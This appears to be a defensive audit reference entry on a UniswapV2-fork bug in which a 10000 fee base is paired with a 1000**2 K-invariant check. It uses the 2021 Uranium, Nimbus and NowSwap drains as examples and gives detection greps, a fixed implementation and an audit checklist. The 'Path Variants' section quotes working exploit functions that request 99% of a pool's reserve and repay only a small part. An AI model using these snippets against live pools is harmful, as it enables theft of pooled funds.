---
# Core Classification
protocol: generic
chain: ethereum, bsc
category: amm_calculation
vulnerability_type: k_invariant_miscalculation

# Pattern Identity
root_cause_family: arithmetic_invariant_break
pattern_key: fee_base_k_check_mismatch | swap_function | constant_product_bypass | pool_drain

# Interaction Scope
interaction_scope: single_contract
involved_contracts:
  - UniswapV2Pair_fork
path_keys:
  - fee_base_k_check_mismatch | swap() | UraniumPair
  - fee_base_k_check_mismatch | swap() | NimbusPair
  - fee_base_k_check_mismatch | swap() | NowSwapPair

# Attack Vector Details
attack_type: arithmetic_exploit
affected_component: swap_k_invariant_check

# Technical Primitives
primitives:
  - k_invariant_mismatch
  - fee_constant_mismatch
  - balance_adjusted_scaling
  - constant_product_bypass

# Grep / Hunt-Card Seeds
code_keywords:
  - "balance0Adjusted"
  - "balance1Adjusted"
  - "1000**2"
  - "10000"
  - ".mul(10000)"
  - ".mul(1000)"
  - "UraniumSwap: K"
  - "Nimbus: K"
  - "FEE_DENOMINATOR"
  - "K_SCALE_FACTOR"
  - "getReserves"
  - "amount0In"
  - "amount1In"

# Impact Classification
severity: critical
impact: fund_loss
exploitability: 0.95
financial_impact: critical

# Context Tags
tags:
  - amm
  - constant_product
  - k_invariant
  - uniswapv2_fork
  - DeFiHackLabs

language: solidity
version: ">=0.6.0"
---

## References & Source Reports

| Label | Source | Path / URL |
|-------|--------|------------|
| [URANIUM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2021-04/Uranium_exp.sol` |
| [NIMBUS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2021-09/Nimbus_exp.sol` |
| [NOWSWAP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2021-09/NowSwap_exp.sol` |

---

# UniswapV2 Fork K-Invariant Mismatch (Fee Base vs K-Check Base)

## Overview

UniswapV2 forks that changed the swap fee from `3/1000` to `N/10000` but forgot to update the K-invariant check from `1000**2` to `10000**2` create a **100x gap** in the swap invariant. This allows an attacker to extract ~99% of every pool's reserves with minimal input in a single atomic transaction. Three protocols were drained in 2021 for **$50M+ combined losses**.

### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | Fee adjustment uses `10000` base but K-check still uses `1000**2` — 100x permissiveness gap |
| Pattern Key | `fee_base_k_check_mismatch \| swap_function \| constant_product_bypass \| pool_drain` |
| Severity | CRITICAL |
| Interaction Scope | `single_contract` — entire exploit is within the Pair contract's `swap()` |
| Trigger | Any `swap()` call with minimal input requesting ~99% of output reserve |
| Sink | Complete pool drainage — attacker extracts nearly all reserves |
| Validation Strength | strong — mathematical proof, 3 independent real-world exploits |

### Contract / Boundary Map

```
Attacker → Pair.swap(amount0Out, amount1Out, to, data)
             ├── balanceOf(token0), balanceOf(token1)  ← current balances
             ├── balance0Adjusted = balance0 * 10000 - amount0In * FEE
             ├── balance1Adjusted = balance1 * 10000 - amount1In * FEE
             └── require(b0Adj * b1Adj >= r0 * r1 * 1000**2)  ← BUG: should be 10000**2
```

### Valid Bug Signals

1. `swap()` function contains `balance.mul(10000)` but K-check uses `mul(1000**2)` or `mul(1000000)`
2. Fee numerator changed from `3` to any other value AND fee denominator changed from `1000` to `10000`
3. K-check right side uses a squared constant that doesn't match the adjustment base on the left side
4. Comment says "UniswapV2 fork" or imports UniswapV2 code with modified fee parameters

### False Positive Guards

1. Not this bug when fee base and K-check base use the same constant (e.g., both `1000` or both `10000`)
2. Not this bug when `FEE_DENOMINATOR` is used as a named constant in both the fee adjustment and the K-check
3. Safe if the protocol uses unmodified UniswapV2 code (`3/1000` fee with `1000**2` K-check)
4. Safe if a separate `_kCheck()` helper enforces `K_SCALE_FACTOR = FEE_DENOMINATOR`

### Code Patterns to Look For

```solidity
uint balance0Adjusted = balance0 * 10000 - amount0In * 16;
uint balance1Adjusted = balance1 * 10000 - amount1In * 16;
require(balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * 1000**2, "K");
```

- High signal when fee-adjusted balances use a 10000 basis-point denominator but the final K comparison still scales reserves by `1000**2`.
- Also inspect forks that changed fee constants, pair math, flash-swap callbacks, or fallback swap routes without updating every invariant comparison.

---

## Root Cause

UniswapV2's original swap function uses `1000` as both the fee denominator and the K-check base:

```solidity
// UniswapV2 ORIGINAL (CORRECT):
uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));  // fee = 3/1000 = 0.3%
uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
require(balance0Adjusted.mul(balance1Adjusted) >= _reserve0.mul(_reserve1).mul(1000**2));
//                                                                              ^^^^^^
//                                                                    matches the 1000 above ✓
```

Forks changed the fee to `N/10000` but only updated the left side:

```solidity
// FORK (VULNERABLE):
uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));  // fee = 16/10000 = 0.16%
uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));
require(balance0Adjusted.mul(balance1Adjusted) >= _reserve0.mul(_reserve1).mul(1000**2));
//      ^^^^^^^^^^^^^^^^ scaled by 10000                                        ^^^^^^
//                                                                    still 1000 — 100x mismatch!
```

**Mathematical consequence**: Left side is `10000^2 = 100,000,000x` larger per unit. Right side only requires `1000^2 = 1,000,000x`. The K-check is effectively `K_new >= K_old / 100`, letting the attacker extract ~99% of reserves.

---

## Path Variants

### Path A: Direct Swap Drain (Uranium — $50M, Apr 2021) `[atomic]`

> **pathShape**: `atomic` — single `swap()` call drains the pool

**Entry**: `UraniumPair.swap(0, drainAmount, attacker, "")` on BSC  
**Fork Block**: 6,920,000  
**Fee Config**: 16/10000 = 0.16%

**Setup**: None — any pool is instantly drainable.

**Firing**:
1. Attacker sends 1 WBNB to the Pair contract
2. Calls `swap(0, reserve1 * 99/100, attacker, "")` requesting 99% of BUSD reserve
3. K-check passes: `(reserve0+1e18)*10000 * (reserve1*0.01)*10000 >= reserve0*reserve1*1000**2` → **true** because LHS is 100x too large
4. Pair transfers ~99% of BUSD to attacker

```solidity
// From Uranium PoC [URANIUM-POC]:
function takeFunds(address token0, address token1, uint256 amount) internal {
    IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(token1, token0));
    IERC20(token0).transfer(address(pair), amount);       // send 1 token
    uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;  // request 99%
    pair.swap(
        pair.token0() == address(token1) ? amountOut : 0,
        pair.token0() == address(token1) ? 0 : amountOut,
        address(this), new bytes(0)
    );
    // @audit K-check passes due to 10000 vs 1000**2 mismatch → drains pool
}
```

### Path B: Flash Swap Drain (Nimbus — Sep 2021) `[atomic]`

> **pathShape**: `atomic` — flash swap callback returns only 10% of borrowed amount

**Entry**: `NimbusPair.swap(drainAmount, 0, attacker, data)` on Ethereum  
**Fork Block**: 13,225,516  
**Fee Config**: 15/10000 = 0.15%  
**Pair**: `0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1` (USDT pair)

**Firing**:
1. Attacker calls `swap()` with non-empty `data` to trigger flash swap
2. Pair transfers 99% of USDT reserve to attacker
3. `NimbusCall()` callback fires — attacker returns only 10% of borrowed amount
4. K-check passes due to identical 10000 vs 1000**2 gap

```solidity
// From Nimbus PoC [NIMBUS-POC]:
function testExploit() public {
    uint256 amount = IERC20(usdt).balanceOf(pair) * 99 / 100;
    IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));
    // @audit Flash swap — requests 99% of USDT reserve
}

function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    IERC20Custom(usdt).transfer(pair, amount0 / 10);
    // @audit Returns only 10% — K-check still passes due to 100x gap
}
```

### Path C: Flash Swap via Fallback (NowSwap — Sep 2021) `[atomic]`

> **pathShape**: `atomic` — identical pattern, uses `fallback()` as callback

**Entry**: `NowSwapPair.swap(0, drainAmount, attacker, data)` on Ethereum  
**Fork Block**: 13,225,516  
**Pair**: `0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62` (NWETH/NBU)

**Firing**:
1. Flash swap requests 99% of NBU reserve
2. `fallback()` returns only 10% of borrowed NBU
3. K-check passes

```solidity
// From NowSwap PoC [NOWSWAP-POC]:
function testExploit() public {
    uint256 amount = IERC20(nbu).balanceOf(pair) * 99 / 100;
    IUniswapV2Pair(pair).swap(0, amount, address(this), abi.encodePacked(amount));
}

fallback() external {
    IERC20Custom(nbu).transfer(pair, IERC20(nbu).balanceOf(address(this)) / 10);
    // @audit Returns 10% via fallback — K-check still 100x permissive
}
```

---

## Vulnerable Pattern

```solidity
// ❌ VULNERABLE: Fee uses 10000 base but K-check uses 1000 base
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    // ... transfer tokens out, calculate amountIn ...

    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(FEE_NUMERATOR));
    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(FEE_NUMERATOR));
    //                                  ^^^^^
    require(
        balance0Adjusted.mul(balance1Adjusted) >=
        uint(_reserve0).mul(_reserve1).mul(1000**2),
        //                                ^^^^^^^^ MISMATCH — should be 10000**2
        'K'
    );
}
```

**Instantiations**:

| Protocol | Fee Numerator | Fee Base | K-Check Base | Gap |
|----------|--------------|----------|-------------|-----|
| Uranium | 16 | 10000 | 1000**2 | 100x |
| Nimbus | 15 | 10000 | 1000**2 | 100x |
| NowSwap | 20 | 10000 | 1000**2 | 100x |

---

## Mathematical Proof

$$\text{K-check}: \quad (\text{bal}_0 \cdot 10000 - \text{in}_0 \cdot F) \cdot (\text{bal}_1 \cdot 10000 - \text{in}_1 \cdot F) \geq r_0 \cdot r_1 \cdot 1000^2$$

For one-sided swap (token0 in, token1 out):

$$\frac{\text{LHS}}{\text{RHS}} = \frac{10000^2}{1000^2} = 100$$

The attacker only needs to maintain $K_{\text{new}} \geq K_{\text{old}} / 100$, allowing extraction of ~99% of one reserve with minimal input.

---

## Impact Analysis

| Protocol | Date | Chain | Loss | Block |
|----------|------|-------|------|-------|
| Uranium Finance | Apr 2021 | BSC | $50M+ | 6,920,000 |
| Nimbus LP | Sep 2021 | Ethereum | Undisclosed | 13,225,516 |
| NowSwap | Sep 2021 | Ethereum | Undisclosed | 13,225,516 |

- **All pools on the DEX drainable** — not limited to one pair
- **Trivial exploitation** — requires 1 wei of input token to drain millions
- **Single-transaction atomic attack** — no setup or staging needed

---

## Secure Implementation

```solidity
// ✅ SECURE: Named constant used for both fee adjustment and K-check
uint256 private constant FEE_DENOMINATOR = 10000;
uint256 private constant FEE_NUMERATOR = 16;  // 0.16%

function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
    // ... transfer and balance calculation ...

    uint balance0Adjusted = balance0.mul(FEE_DENOMINATOR).sub(amount0In.mul(FEE_NUMERATOR));
    uint balance1Adjusted = balance1.mul(FEE_DENOMINATOR).sub(amount1In.mul(FEE_NUMERATOR));

    /// @dev INVARIANT: K_SCALE = FEE_DENOMINATOR — must match
    require(
        balance0Adjusted.mul(balance1Adjusted) >=
        uint(_reserve0).mul(_reserve1).mul(FEE_DENOMINATOR ** 2),
        'K'
    );
}
```

---

## Detection Patterns

```bash
# Find fee adjustment with 10000 base
grep -rn "\.mul(10000)" --include="*.sol" | grep -i "balance\|adjusted"

# Find K-check with 1000 base
grep -rn "1000\*\*2\|1000000" --include="*.sol" | grep -i "reserve\|require"

# Cross-reference: if BOTH match in the same file → URANIUM BUG
```

**Quick verification for any UniswapV2 fork**:
1. Find: `balance.mul(X).sub(amountIn.mul(Y))` → note X
2. Find: `require(... >= reserve.mul(reserve).mul(Z))` → note Z
3. Check: `X^2 == Z` — if not, this is the bug

---

## Audit Checklist

- [ ] Is this a UniswapV2 fork with modified fees?
- [ ] Does the fee adjustment base (left side) match the K-check base (right side)?
- [ ] Are fee constants defined as named constants shared between fee and K-check?
- [ ] Has the `swap()` function been diffed against canonical UniswapV2 code?

---

## Real-World Examples

| Protocol | Date | Loss | Root Cause | PoC |
|----------|------|------|-----------|-----|
| Uranium Finance | Apr 2021 | $50M+ | 16/10000 fee, 1000**2 K-check | [URANIUM-POC] |
| Nimbus LP | Sep 2021 | Undisclosed | 15/10000 fee, 1000**2 K-check | [NIMBUS-POC] |
| NowSwap | Sep 2021 | Undisclosed | 20/10000 fee, 1000**2 K-check | [NOWSWAP-POC] |

---

## Exploit-Derived Invariants

1. **K-check base must equal fee adjustment base**: If `swap()` uses `balance.mul(BASE)`, the invariant check must use `reserve.mul(reserve).mul(BASE**2)`.
2. **Named constants prevent copy-paste mismatch**: Fee denominator and K-scale factor should be the same constant, not separate hardcoded literals.
3. **Any UniswapV2 fork with modified fees requires a full swap-function diff** against canonical code before deployment.
